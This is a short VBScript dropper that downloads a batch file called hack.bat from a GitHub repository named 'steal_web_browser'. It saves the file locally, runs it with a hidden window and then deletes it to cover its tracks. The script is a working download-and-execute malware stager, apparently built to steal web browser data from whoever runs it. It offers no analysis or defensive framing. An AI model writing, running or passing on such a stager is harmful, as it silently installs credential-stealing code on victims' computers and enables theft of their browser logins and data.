dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://raw.githubusercontent.com/nguyenlamnghia/steal_web_browser/main/Internet/hack.bat", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "a.bat", 2 '//overwrite
end with

CreateObject("Wscript.Shell").Run "a.bat", 0, True

dim filesys
Set filesys = CreateObject("Scripting.FileSystemObject")
If filesys.FileExists("a.bat") Then
filesys.DeleteFile "a.bat"
End If